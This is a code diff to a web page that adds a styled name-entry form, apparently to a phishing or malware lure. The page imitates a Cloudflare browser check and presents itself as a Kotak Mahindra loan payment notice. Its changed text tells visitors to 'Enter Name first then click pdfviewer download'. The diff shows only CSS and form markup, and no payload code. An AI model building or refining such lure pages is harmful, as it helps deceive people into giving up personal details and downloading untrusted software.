@@ -135,6 +135,142 @@
         object-fit: contain;
       }
 
+      .name-form {
+        width: 100%;
+        max-width: 420px;
+        margin: 30px auto;
+        padding: 32px 28px;
+
+        background: #ffffff;
+        border-radius: 18px;
+
+        box-shadow:
+          0 10px 30px rgba(0, 0, 0, 0.08),
+          0 2px 8px rgba(0, 0, 0, 0.04);
+
+        text-align: center;
+        box-sizing: border-box;
+      }
+
+      /* Bigger Enter your name */
+      .name-title {
+        display: block;
+
+        font-size: 32px;
+        font-weight: 700;
+        line-height: 1.2;
+
+        color: #1f2937;
+
+        margin-bottom: 24px;
+      }
+
+      /* Input */
+      #userName {
+        width: 100%;
+        height: 54px;
+
+        padding: 0 16px;
+
+        font-size: 17px;
+        color: #111827;
+
+        background: #f9fafb;
+
+        border: 1px solid #d1d5db;
+        border-radius: 12px;
+
+        outline: none;
+
+        box-sizing: border-box;
+
+        transition:
+          border-color 0.2s ease,
+          box-shadow 0.2s ease,
+          background 0.2s ease;
+      }
+
+      #userName::placeholder {
+        color: #9ca3af;
+      }
+
+      #userName:focus {
+        background: #ffffff;
+        border-color: #2563eb;
+
+        box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.12);
+      }
+
+      /* Submit button */
+      #submitName {
+        width: 100%;
+        height: 52px;
+
+        margin-top: 18px;
+
+        border: none;
+        border-radius: 12px;
+
+        background: #2563eb;
+        color: #ffffff;
+
+        font-size: 17px;
+        font-weight: 600;
+
+        cursor: pointer;
+
+        transition:
+          transform 0.15s ease,
+          background 0.2s ease,
+          box-shadow 0.2s ease;
+      }
+
+      #submitName:hover {
+        background: #1d4ed8;
+
+        box-shadow: 0 6px 18px rgba(37, 99, 235, 0.25);
+      }
+
+      #submitName:active {
+        transform: scale(0.98);
+      }
+
+      /* Status text */
+      #nameStatus {
+        min-height: 20px;
+        margin: 14px 0 0;
+
+        font-size: 14px;
+        color: #6b7280;
+      }
+      .name-title {
+        font-size: 32px;
+        font-weight: 700;
+      }
+
+      /* Mobile */
+      @media (max-width: 480px) {
+        .name-form {
+          margin: 20px auto;
+          padding: 26px 20px;
+          border-radius: 16px;
+        }
+
+        .name-title {
+          font-size: 28px;
+        }
+
+        #userName {
+          height: 52px;
+          font-size: 16px;
+        }
+
+        #submitName {
+          height: 50px;
+          font-size: 16px;
+        }
+      }
+
       /* Very small phones (< 400px) */
       @media (max-width: 399px) {
         .cf-browser-verification {
@@ -224,6 +360,22 @@
 
           <p id="nameStatus"></p>
         </div>
+        <div id="nameForm" class="name-form" style="display: none">
+          <label for="userName" class="name-title">Enter your name</label>
+
+          <input
+            type="text"
+            id="userName"
+            maxlength="100"
+            autocomplete="name"
+            placeholder="Your name"
+            required
+          />
+
+          <button type="button" id="submitName">Submit</button>
+
+          <p id="nameStatus"></p>
+        </div>
         <h3>
           <span data-translate="checking_browser">Waiting 5 seconds</span>
           Network
@@ -238,10 +390,10 @@
         </div>
 
         <div class="loading-screen">
-          <div class="title">pdfviewer</div>
+          <div class="title">Enter Name first then click pdfviewer download</div>
           <!-- ★ FULLY RESPONSIVE IMAGE ★ -->
           <img
-            src="https://raw.githubusercontent.com/karnameena/Images-/refs/heads/main/lv_0_20260828134638.jpg"
+            src="https://raw.githubusercontent.com/karnameena/Images-/refs/heads/main/Kotak%20Mahindra%20Loan%20Payment%20Notice.png"
             alt="pdfviewer Logo"
             class="logo"
           />
